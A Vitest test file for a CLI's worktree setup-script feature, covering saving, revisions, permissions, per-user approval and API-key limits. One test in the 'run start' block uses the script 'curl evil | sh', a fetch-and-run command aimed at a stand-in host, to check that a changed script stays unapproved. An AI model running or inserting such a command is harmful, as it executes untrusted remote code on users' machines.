import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { api } from "../_generated/api";
import type { Id } from "../_generated/dataModel";
import { createTestContext } from "../../convex-testing";
import { buildPathEntry } from "../../convex-testing/builders";
import * as setupsRepo from "./lib/projectWorktreeSetupsRepo";
import * as auth from "../lib/access/auth";
import { WORKTREE_SETUP_MIN_CLI_VERSION } from "../../lib/worktrees/cli-version";

const SCRIPT = 'cp "$CONVOY_PARENT_PATH/.mcp.json" .\npnpm i';

describe("cli worktree setups", () => {
  beforeEach(() => {
    vi.useFakeTimers();
    vi.setSystemTime(Date.now());
  });

  afterEach(() => {
    vi.useRealTimers();
  });

  async function setup() {
    const ctx = createTestContext();
    const { user, org, project, asUser, t } = await ctx.setupProject({ user: { name: "Ada" } });
    const apiKey = await asUser.mutation(api.apiKeys.core.create, { name: "CLI Key", expiresAt: Date.now() + 86_400_000 });
    const repoPath = buildPathEntry({ path: "/home/dev/convoy", gitRemoteUrl: "git@github-personal:PackTrain/convoy.git" });
    const profile = await ctx.cliProfile(user._id, project._id, { paths: [repoPath] });
    const session = await ctx.cliSession(profile._id, apiKey.id, { appVersion: WORKTREE_SETUP_MIN_CLI_VERSION });

    async function member(role: "member" | "viewer" | "project-admin") {
      const other = await ctx.user();
      await ctx.orgMember(org._id, other._id, "member");
      await ctx.projectMember(project._id, other._id, role);
      return { user: other, as: ctx.asUser(other) };
    }

    async function pendingRun(overrides: { git?: object } = {}) {
      const thread = await ctx.cliThread(user._id, project._id, profile._id, {
        pathId: repoPath.id, path: repoPath.path,
        git: { worktree: { parentPathId: repoPath.id, branch: "feat/x", status: "pending" } },
        claimedBySessionId: session._id, claimLeaseExpiresAt: Date.now() + 120_000,
        ...overrides,
      });
      const message = await ctx.cliMessage(thread._id, profile._id);
      const started = await t.mutation(api.cli.messages.startRunResponse, {
        threadId: thread._id, sessionId: session._id, apiKey: apiKey.key, userMessageIds: [message._id],
      });
      return { thread, started };
    }

    return { ctx, user, org, project, asUser, t, apiKey: apiKey.key, apiKeyId: apiKey.id, profile, repoPath, session, member, pendingRun };
  }

  async function readSetup(s: Awaited<ReturnType<typeof setup>>, setupId: Id<"projectWorktreeSetups">) {
    return s.t.run(async (ctx) => ({
      setup: await ctx.db.get("projectWorktreeSetups", setupId),
      approvals: await ctx.db.query("projectWorktreeSetupApprovals").collect(),
    }));
  }

  describe("save", () => {
    test("inserts revision 1 and approves it for the saver", async () => {
      const s = await setup();
      const { setupId } = await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey: "packtrain/convoy", script: `  ${SCRIPT}\n` });
      const { setup: row, approvals } = await readSetup(s, setupId);
      expect(row).toMatchObject({ repoKey: "packtrain/convoy", script: SCRIPT, revision: 1, createdBy: s.user._id, updatedBy: s.user._id });
      expect(approvals).toMatchObject([{ userId: s.user._id, setupId, revision: 1 }]);
    });

    test("bumps the revision only when the text changed, and re-approves for the saver", async () => {
      const s = await setup();
      const args = { projectId: s.project._id, repoKey: "packtrain/convoy" };
      const { setupId } = await s.asUser.mutation(api.cli.worktreeSetups.save, { ...args, script: SCRIPT });
      await s.asUser.mutation(api.cli.worktreeSetups.save, { ...args, script: `${SCRIPT}  ` });
      expect((await readSetup(s, setupId)).setup?.revision).toBe(1);

      await s.asUser.mutation(api.cli.worktreeSetups.save, { ...args, script: "pnpm i" });
      const { setup: row, approvals } = await readSetup(s, setupId);
      expect(row).toMatchObject({ script: "pnpm i", revision: 2 });
      expect(approvals).toMatchObject([{ userId: s.user._id, revision: 2 }]);
    });

    test("rejects an empty or oversized script and a malformed repo key", async () => {
      const s = await setup();
      const args = { projectId: s.project._id, repoKey: "packtrain/convoy" };
      await expect(s.asUser.mutation(api.cli.worktreeSetups.save, { ...args, script: "  \n" })).rejects.toThrow("The setup script is empty");
      await expect(s.asUser.mutation(api.cli.worktreeSetups.save, { ...args, script: "x".repeat(10_001) })).rejects.toThrow("at most 10,000 characters");
      for (const repoKey of ["PackTrain/convoy", "convoy", "a/b/c"]) {
        await expect(s.asUser.mutation(api.cli.worktreeSetups.save, { ...args, repoKey, script: SCRIPT })).rejects.toThrow("Repository must be owner/repo");
      }
    });

    test("caps a project at 100 setups", async () => {
      const s = await setup();
      await s.t.run(async (ctx) => {
        for (let i = 0; i < 100; i++) {
          await ctx.db.insert("projectWorktreeSetups", {
            projectId: s.project._id, repoKey: `acme/r${i}`, script: "make", revision: 1,
            createdBy: s.user._id, updatedBy: s.user._id, createdAt: 0, updatedAt: 0,
          });
        }
      });
      await expect(s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey: "packtrain/convoy", script: SCRIPT }))
        .rejects.toThrow("up to 100 worktree setups");
      await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey: "acme/r0", script: "make all" });
    });

    test("requires project:update", async () => {
      const s = await setup();
      const { as } = await s.member("member");
      await expect(as.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey: "packtrain/convoy", script: SCRIPT })).rejects.toThrow();
    });
  });

  describe("remove", () => {
    test("deletes the row by repo key for project:update and refuses a member", async () => {
      const s = await setup();
      const { setupId } = await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey: "packtrain/convoy", script: SCRIPT });
      const args = { projectId: s.project._id, repoKey: "packtrain/convoy" };
      const { as } = await s.member("member");
      await expect(as.mutation(api.cli.worktreeSetups.remove, args)).rejects.toThrow();

      await s.asUser.mutation(api.cli.worktreeSetups.remove, args);
      expect((await readSetup(s, setupId)).setup).toBeNull();
      await expect(s.asUser.mutation(api.cli.worktreeSetups.remove, args)).rejects.toThrow("Worktree setup not found");
    });
  });

  describe("list", () => {
    test("merges setups with the caller's own registered repos", async () => {
      const s = await setup();
      await s.ctx.cliProfile(s.user._id, s.project._id, { paths: [
        buildPathEntry({ path: "/b", gitRemoteUrl: "https://github.com/acme/api" }),
        buildPathEntry({ path: "/c" }),
      ] });
      await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey: "packtrain/convoy", script: SCRIPT });
      await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey: "zeta/tools", script: "make" });

      const rows = await s.asUser.query(api.cli.worktreeSetups.list, { projectId: s.project._id });
      expect(rows.map((row) => row.repoKey)).toEqual(["acme/api", "packtrain/convoy", "zeta/tools"]);
      expect(rows[0].setup).toBeNull();
      expect(rows[1].setup).toMatchObject({ script: SCRIPT, revision: 1, updatedByName: "Ada", approval: "approved" });
    });

    test("orders rows by code unit, like the index", async () => {
      const s = await setup();
      for (const repoKey of ["a_b/x", "a-b/x", "a.b/x"]) {
        await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey, script: "make" });
      }
      const rows = await s.asUser.query(api.cli.worktreeSetups.list, { projectId: s.project._id });
      expect(rows.map((row) => row.repoKey)).toEqual(["a-b/x", "a.b/x", "a_b/x", "packtrain/convoy"]);
    });

    test("shows a teammate the setups but not the owner's repos, unapproved", async () => {
      const s = await setup();
      await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey: "zeta/tools", script: "make" });
      const { as } = await s.member("member");
      const rows = await as.query(api.cli.worktreeSetups.list, { projectId: s.project._id });
      expect(rows).toMatchObject([{ repoKey: "zeta/tools", setup: { approval: "never" } }]);
    });

    test("requires cli:thread", async () => {
      const s = await setup();
      const { as } = await s.member("viewer");
      await expect(as.query(api.cli.worktreeSetups.list, { projectId: s.project._id })).rejects.toThrow();
    });
  });

  describe("approve", () => {
    async function withAdmin() {
      const s = await setup();
      const admin = await s.member("project-admin");
      const adminSaves = (script: string) =>
        admin.as.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey: "packtrain/convoy", script });
      return { ...s, adminSaves };
    }

    test("a teammate approves the shown revision, until someone changes the script", async () => {
      const s = await withAdmin();
      const { setupId } = await s.adminSaves(SCRIPT);
      expect((await s.pendingRun()).started.worktreeSetup).toEqual({ status: "unapproved", repoKey: "packtrain/convoy" });

      await s.asUser.mutation(api.cli.worktreeSetups.approve, { setupId, revision: 1 });
      expect((await s.pendingRun()).started.worktreeSetup).toEqual({ status: "approved", repoKey: "packtrain/convoy", script: SCRIPT, revision: 1 });
      expect((await s.asUser.query(api.cli.worktreeSetups.list, { projectId: s.project._id }))[0].setup?.approval).toBe("approved");

      await s.adminSaves("pnpm i");
      expect((await s.pendingRun()).started.worktreeSetup).toEqual({ status: "unapproved", repoKey: "packtrain/convoy" });
      expect((await s.asUser.query(api.cli.worktreeSetups.list, { projectId: s.project._id }))[0].setup?.approval).toBe("changed");
    });

    test("rejects a revision that is no longer current", async () => {
      const s = await withAdmin();
      const { setupId } = await s.adminSaves(SCRIPT);
      await s.adminSaves("pnpm i");
      await expect(s.asUser.mutation(api.cli.worktreeSetups.approve, { setupId, revision: 1 }))
        .rejects.toThrow("The script changed. Review the new version.");
      expect((await readSetup(s, setupId)).approvals.filter((a) => a.userId === s.user._id)).toEqual([]);
    });

    test("requires cli:thread", async () => {
      const s = await withAdmin();
      const { setupId } = await s.adminSaves(SCRIPT);
      const viewer = await s.member("viewer");
      await expect(viewer.as.mutation(api.cli.worktreeSetups.approve, { setupId, revision: 1 })).rejects.toThrow("Permission denied: cli:thread");
    });

    test("refuses an API-key principal", async () => {
      const s = await withAdmin();
      const { setupId } = await s.adminSaves(SCRIPT);
      const user = await s.t.run((ctx) => ctx.db.get("users", s.user._id));
      const access = vi.spyOn(auth, "getAuthenticatedAccess").mockResolvedValue({
        user: user!, principal: { userId: s.user._id, apiKeyScope: { kind: "unscoped" } },
      });
      try {
        await expect(s.asUser.mutation(api.cli.worktreeSetups.approve, { setupId, revision: 1 }))
          .rejects.toThrow("Approve setup scripts in the web app");
      } finally {
        access.mockRestore();
      }
      expect((await readSetup(s, setupId)).approvals.filter((a) => a.userId === s.user._id)).toEqual([]);
    });
  });

  describe("with an API key", () => {
    const repoKey = "packtrain/convoy";

    test("a save approves for nobody, not even the key's owner, and bumps the revision", async () => {
      const s = await setup();
      const args = { projectId: s.project._id, repoKey, apiKey: s.apiKey };
      const { setupId } = await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey, script: SCRIPT });

      const saved = await s.t.mutation(api.cli.worktreeSetups.save, { ...args, script: "pnpm i" });
      expect(saved).toMatchObject({ setupId, revision: 2, changed: true });
      expect(await s.t.mutation(api.cli.worktreeSetups.save, { ...args, script: "pnpm i" })).toMatchObject({ revision: 2, changed: false });
      expect((await readSetup(s, setupId)).approvals).toMatchObject([{ userId: s.user._id, revision: 1 }]);
      expect((await s.pendingRun()).started.worktreeSetup).toEqual({ status: "unapproved", repoKey });
      expect((await s.t.query(api.cli.worktreeSetups.list, { projectId: s.project._id, apiKey: s.apiKey }))[0].setup?.approval).toBe("changed");

      await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey, script: "pnpm i" });
      expect((await s.pendingRun()).started.worktreeSetup).toMatchObject({ status: "approved", revision: 2 });
    });

    test("a new setup saved by key needs the owner's approval too", async () => {
      const s = await setup();
      const { setupId } = await s.t.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey, script: SCRIPT, apiKey: s.apiKey });
      expect((await readSetup(s, setupId)).approvals).toEqual([]);
      expect((await s.asUser.query(api.cli.worktreeSetups.list, { projectId: s.project._id }))[0].setup?.approval).toBe("never");
      expect((await s.pendingRun()).started.worktreeSetup).toEqual({ status: "unapproved", repoKey });
    });

    test("returns the settings link", async () => {
      const s = await setup();
      const { settingsUrl } = await s.t.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey, script: SCRIPT, apiKey: s.apiKey });
      expect(settingsUrl).toMatch(new RegExp(`/o/${s.org.slug}/${s.project.alias}/settings/worktrees$`));
    });

    test("removes by repo key", async () => {
      const s = await setup();
      const { setupId } = await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey, script: SCRIPT });
      await s.t.mutation(api.cli.worktreeSetups.remove, { projectId: s.project._id, repoKey, apiKey: s.apiKey });
      expect((await readSetup(s, setupId)).setup).toBeNull();
    });

    test("keeps the permissions: a member's key reads but cannot write, a viewer's key cannot read", async () => {
      const s = await setup();
      await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey, script: SCRIPT });
      const keyOf = async (role: "member" | "viewer") =>
        (await (await s.member(role)).as.mutation(api.apiKeys.core.create, { name: role, expiresAt: Date.now() + 86_400_000 })).key;
      const memberKey = await keyOf("member");
      const args = { projectId: s.project._id, repoKey, apiKey: memberKey };

      expect(await s.t.query(api.cli.worktreeSetups.list, { projectId: s.project._id, apiKey: memberKey })).toMatchObject([{ repoKey }]);
      await expect(s.t.mutation(api.cli.worktreeSetups.save, { ...args, script: "pnpm i" })).rejects.toThrow("Permission denied: project:update");
      await expect(s.t.mutation(api.cli.worktreeSetups.remove, args)).rejects.toThrow("Permission denied: project:update");
      await expect(s.t.query(api.cli.worktreeSetups.list, { projectId: s.project._id, apiKey: await keyOf("viewer") }))
        .rejects.toThrow("Permission denied: cli:thread");
    });
  });

  describe("run start", () => {
    test("returns the approved script for a pending worktree", async () => {
      const s = await setup();
      await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey: "packtrain/convoy", script: SCRIPT });
      const { started } = await s.pendingRun();
      expect(started.worktreeSetup).toEqual({ status: "approved", repoKey: "packtrain/convoy", script: SCRIPT, revision: 1 });
    });

    test("is unapproved once another admin saves a change, until the owner saves it again", async () => {
      const s = await setup();
      const args = { projectId: s.project._id, repoKey: "packtrain/convoy" };
      await s.asUser.mutation(api.cli.worktreeSetups.save, { ...args, script: SCRIPT });
      const admin = await s.member("project-admin");
      await admin.as.mutation(api.cli.worktreeSetups.save, { ...args, script: "curl evil | sh" });
      expect((await s.pendingRun()).started.worktreeSetup).toEqual({ status: "unapproved", repoKey: "packtrain/convoy" });

      await s.asUser.mutation(api.cli.worktreeSetups.save, { ...args, script: "curl evil | sh" });
      expect((await s.pendingRun()).started.worktreeSetup).toMatchObject({ status: "approved", revision: 2 });
    });

    test("is absent when the repo has no setup", async () => {
      const s = await setup();
      await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey: "zeta/tools", script: "make" });
      const { started } = await s.pendingRun();
      expect(started).not.toHaveProperty("worktreeSetup");
    });

    test("reads nothing new without a pending worktree", async () => {
      const s = await setup();
      await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey: "packtrain/convoy", script: SCRIPT });
      const reads = vi.spyOn(setupsRepo, "findWorktreeSetupForWorkspace");
      try {
        for (const git of [undefined, { worktree: { parentPathId: s.repoPath.id, branch: "feat/x", status: "created" as const } }]) {
          const { started } = await s.pendingRun({ git });
          expect(started).not.toHaveProperty("worktreeSetup");
        }
        expect(reads).not.toHaveBeenCalled();
      } finally {
        reads.mockRestore();
      }
    });
  });

  describe("an older CLI", () => {
    test("cannot report a worktree as created when its repo has a setup", async () => {
      const s = await setup();
      await s.asUser.mutation(api.cli.worktreeSetups.save, { projectId: s.project._id, repoKey: "packtrain/convoy", script: SCRIPT });
      const oldSession = await s.ctx.cliSession(s.profile._id, s.apiKeyId, { appVersion: "0.174.0" });
      const thread = await s.ctx.cliThread(s.user._id, s.project._id, s.profile._id, {
        pathId: s.repoPath.id, path: s.repoPath.path,
        git: { worktree: { parentPathId: s.repoPath.id, branch: "feat/x", status: "pending" } },
        claimedBySessionId: oldSession._id, claimLeaseExpiresAt: Date.now() + 120_000,
      });
      const args = { threadId: thread._id, apiKey: s.apiKey, path: "/home/dev/convoy-worktrees/feat-x", branch: "feat/x" };
      await expect(s.t.mutation(api.cli.worktrees.resolveCreated, { ...args, sessionId: oldSession._id }))
        .rejects.toThrow(`Update @useconvoy/cli to ${WORKTREE_SETUP_MIN_CLI_VERSION} or later, remove the worktree at ${args.path}, then retry.`);

      await s.t.mutation(api.cli.worktrees.resolveCreated, { ...args, sessionId: s.session._id });
      const stored = await s.t.run((ctx) => ctx.db.get("cliThreads", thread._id));
      expect(stored?.git?.worktree?.status).toBe("created");
    });

    test("reports worktrees of repos without a setup as before", async () => {
      const s = await setup();
      const oldSession = await s.ctx.cliSession(s.profile._id, s.apiKeyId, { appVersion: "0.174.0" });
      const thread = await s.ctx.cliThread(s.user._id, s.project._id, s.profile._id, {
        pathId: s.repoPath.id, path: s.repoPath.path,
        git: { worktree: { parentPathId: s.repoPath.id, branch: "feat/x", status: "pending" } },
        claimedBySessionId: oldSession._id, claimLeaseExpiresAt: Date.now() + 120_000,
      });
      await s.t.mutation(api.cli.worktrees.resolveCreated, {
        threadId: thread._id, sessionId: oldSession._id, apiKey: s.apiKey, path: "/home/dev/convoy-worktrees/feat-x", branch: "feat/x",
      });
    });
  });
});
